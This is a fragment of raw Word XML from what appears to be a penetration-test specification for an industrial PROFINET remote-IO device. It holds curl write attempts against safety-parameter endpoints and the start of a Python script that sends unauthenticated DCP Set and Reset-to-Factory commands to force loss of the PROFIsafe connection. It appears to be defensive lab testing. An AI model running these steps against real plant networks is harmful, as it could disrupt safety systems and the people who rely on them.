            <w:r w:rsidRPr="00D73D4E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9CFD7" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>1. Enumerate writable-looking IoT-Core endpoints. 2. Attempt HTTP writes (PUT/POST/SETDATA) to safety-relevant nodes (/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>safecom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/*, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">-related). </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">3. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Confirm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each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is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rejected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>read-only</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="707A3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10FF0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D545D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PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> all safety-parameter write attempts via IoT-Core are refused (read-only enforced). </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> any safety parameter is writable via IoT-Core.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B774D89" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E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511"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="73C676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E65404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31EFBB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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="2FC41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F4ECF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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E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F0F1F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TC-RQ011-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="666BF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6470E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08E33" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="6991D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F289A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58812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curl (write attempts), IoT-Core visualizer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A375A04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># TC-RQ011-01 Attempt safety-parameter writes via IoT-Core (expect read-only)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58850200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 xml:space="preserve">curl -s -X POST </w:t>
      </w:r>
      <w:hyperlink r:id="rId287" w:history="1">
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/safecom/f_address</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -d 'value=42' -w '\n%{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}\n'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AA9CD6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 xml:space="preserve">curl -s -X PUT </w:t>
      </w:r>
      <w:hyperlink r:id="rId288" w:history="1">
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/deviceinfo/swrevision</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -d 'value=9.9' -w '\n%{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}\n'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094F6143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># expect: rejected / method not allowed / read-only (SRIO-8299, SRIO-7908)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4552FE90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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | All writes refused (IoT-Core read-only; parameter writes removed from IoT path). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Read-only enforced (G-3 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1101_iot_write.txt (HTTP codes), Visualizer screenshot | </w:t>
      </w:r>
      <w:hyperlink r:id="rId289" w:history="1">
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId290" w:history="1">
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00483B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1BFCC621" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="37DB4D74">
          <v:rect id="_x0000_i1756" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4992CA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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ011-02 — Unauthenticated DCP Factory-Reset of Communication Config (G-2 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60912F11" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E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7756"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="487301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C7774B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384319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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="626DE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E8403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B5D79" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TC-RQ011-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="41EB0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7D629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FAD5F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>RQ-011 → CR 1.2 / CR 2.1 → Asset G, Asset F, Asset B</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="4C009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7BCE5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691B4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Spoofing + Elevation of Privilege</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (unauthenticated privileged action)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="282783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F0B1A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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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9C0D5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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="2D84A1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7E97A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lastRenderedPageBreak/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4A1EB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Empirically determine whether a peer node on the OT segment can issue a </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>DCP Set / Reset-to-Factory (Mode 2, mandatory; 3/4 if present)</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and thereby reset the device's communication configuration (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>NameOfStation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, IP) — </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>without any credential and without touching the physical switch barrier</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — demonstrating that a connection-relevant setting can be modified by an unauthorized third party.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="677A4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19D68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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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072A0" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Baseline </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>NameOfStation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/IP and operating state. 2. From the Pi, issue a DCP Identify, then a DCP Set (change </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>NameOfStation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/IP) and a DCP Reset-to-Factory. 3. Observe whether the actions succeed without authentication. 4. Observe the safety impact (loss of </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> connection → passivation). </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">5. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Attempt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higher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reset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modes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if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supported</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="0F284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08D9C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57E3A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PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> DCP set/reset requires authentication or is refused from an unauthorized node. </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the reset succeeds unauthenticated (corroborated by SRIO-3029 "…at any time"), confirming </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — an unauthorized third party can modify connection-relevant config, forcing safe-state. Record the </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>bound</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: it affects comm parameters (→ passivation), not silent safety-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> modification.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17561C19" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E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D73D4E" w:rsidRPr="00D73D4E" w14:paraId="79C578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80A227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D99F6A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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="093E4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C1621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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E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9AC27" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>TC-RQ011-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="20660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5BBC6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17C2F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">Pi eth0 = 192.168.0.100 (OT </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>segment</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>peer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node</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">); DUT 192.168.0.2; SPS 192.168.0.1; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>laptop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mirror</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="26F99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49FCE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34F65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t>pnio_dcp</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (Pi), Wireshark (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>laptop</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5093EB53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>#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B7A625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># TC-RQ011-02 Unauthenticated DCP set/reset from a peer node (AUTHORIZATION aspect)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016DAEDD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 xml:space="preserve">import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pnio_dcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="67DA0A75" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pnio_dcp.DCP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("eth0")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D010DC" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>for d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dcp.identify_all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73238B81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 xml:space="preserve">print("Found:", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>d.name_of_station</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, d.MAC, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00483B71">
